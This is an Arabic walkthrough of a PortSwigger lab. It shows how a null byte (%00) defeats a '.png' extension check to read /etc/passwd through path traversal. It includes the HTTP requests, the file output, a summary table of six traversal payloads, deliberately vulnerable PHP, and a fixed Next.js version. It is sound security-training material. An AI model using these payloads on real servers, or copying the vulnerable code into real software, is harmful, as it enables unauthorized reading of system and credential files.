# Lab: File path traversal, validation of file extension with null byte bypass

> **Category:** Path Traversal  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-null-byte-bypass)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة Path Traversal في عرض صور المنتجات، ولكن هذه المرة الخادم **يتحقق أن امتداد الملف ينتهي بـ `.png`**، لذلك سنستخدم **Null Byte (`%00`)** لإنهاء السلسلة قبل الامتداد وتجاوز الفلتر.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: الدخول إلى المختبر

- اضغط **Access the lab** لفتح موقع المتجر الوهمي.

### الخطوة 2: تشغيل Burp Suite واعتراض الطلب

- افتح Burp Suite وتأكد من تشغيل الـ Proxy.
- اضغط على أي منتج لعرض صورته.
- في Burp → **Proxy > HTTP history**، ابحث عن الطلب:

```http
GET /image?filename=product1.jpg HTTP/1.1
Host: vulnerable-website.com
```

### الخطوة 3: إرسال الطلب إلى Repeater

- حدد الطلب، زر الماوس الأيمن → **Send to Repeater**.

### الخطوة 4: تجربة الطريقة القديمة (ستفشل)

جرب `../../../etc/passwd` أولاً:
```http
GET /image?filename=../../../etc/passwd HTTP/1.1
```
ستجد أنها **لا تعمل** لأن الخادم يتطلب أن ينتهي الملف بـ `.png`.

### الخطوة 5: فهم آلية الفلتر

الخادم يتحقق أن `filename` ينتهي بـ `.png` قبل استخدامه.

### الخطوة 6: استخدام Null Byte (`%00`)

في بعض اللغات القديمة (مثل C/C++)، Null Byte (`\0`) يعني نهاية السلسلة.

قم بتغيير `filename` إلى:
```
../../../etc/passwd%00.png
```

يصبح الطلب:
```http
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
```

### الخطوة 7: ماذا يحدث خلف الكواليس؟

| الخطوة | القيمة |
|--------|--------|
| ما نرسله | `../../../etc/passwd%00.png` |
| بعد التحقق | ينتهي بـ `.png` ✅ |
| بعد معالجة Null Byte | `../../../etc/passwd` (يتوقف عند `%00`) |
| المسار النهائي | `/etc/passwd` يتم قراءته |

### الخطوة 8: إرسال الطلب

- اضغط **Send** في Repeater.

### الخطوة 9: مشاهدة النتيجة

ستظهر استجابة تحتوي على محتوى `/etc/passwd`:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
carlos:x:1001:1001:,,,:/home/carlos:/bin/bash
```

### الخطوة 10: حل المختبر

بمجرد ظهور المحتوى، تم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو Null Byte (`%00`)?** | حرف خاص يعني نهاية السلسلة في بعض اللغات (مثل C) |
| **كيف يعمل التجاوز؟** | الخادم يتحقق من `.png`، لكنه يتوقف عند `%00` أثناء القراءة |
| **لماذا نجح هذا؟** | التحقق من الامتداد يتم قبل معالجة Null Byte |
| **متى يصلح هذا؟** | في اللغات القديمة (PHP قديم، CGI، C/C++)، أما الحديثة فمحصنة |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من الامتداد، ولكن عند قراءة الملف، Null Byte يقطع السلسلة ويتجاهل الامتداد.

---

### ❌ Non-Compliant Code (PHP - قديم)

```php
<?php
$filename = $_GET['filename']; // "../../../etc/passwd%00.png"

// التحقق: ينتهي بـ .png ✅
if (substr($filename, -4) !== '.png') {
    die('Forbidden');
}

// المشكلة: Null Byte يقطع المسار
$filepath = '/var/www/images/' . $filename; // يتوقف عند %00
readfile($filepath); // يقرأ /etc/passwd
?>
```

---

### ✅ Compliant Code (Next.js - آمن)

```javascript
const { filename } = req.query;

// 1. إزالة Null Byte
const cleanFilename = filename.replace(/\0/g, '');

// 2. التحقق من الامتداد
if (!cleanFilename.endsWith('.png')) {
  return res.status(403).send('Forbidden');
}

// 3. استخراج اسم الملف النقي
const safeFilename = path.basename(cleanFilename);
const filePath = path.join('public/images', safeFilename);
fs.readFileSync(filePath);
```

**الخلاصة:** Null Byte لا يعمل في البيئات الحديثة (Node.js, PHP 5.3+). الحل هو ترقية البيئة أو إزالة `%00`.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **ترقية البيئة:** Null Byte لا يعمل في اللغات الحديثة (Node.js، Python، PHP 5.3+).
2. **إزالة Null Byte:** استخدم `replace(/\0/g, '')` لإزالة أي Null Byte.
3. **استخدام `path.basename()`:** يزيل أي مسارات ضارة.
4. **التحقق من الامتداد بعد التنظيف:** تأكد من الامتداد بعد إزالة الأحرف الخاصة.

---

## 📊 ملخص لابات Path Traversal

| اللاب | الفلتر | البايلود |
|-------|--------|----------|
| الأول | ولا فلتر | `../../../etc/passwd` |
| الثاني | يمنع `../` | `/etc/passwd` |
| الثالث | يحذف `../` مرة واحدة | `....//....//....//etc/passwd` |
| الرابع | يمنع `../` ثم URL-decode | `..%252f..%252f..%252fetc/passwd` |
| الخامس | يتحقق من بداية المسار | `/var/www/images/../../../etc/passwd` |
| السادس | يتحقق من امتداد `.png` | `../../../etc/passwd%00.png` |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-path-traversal/lab-null-byte-bypass)
- [Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal)
- [Null Byte Injection](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#null-byte-injection)
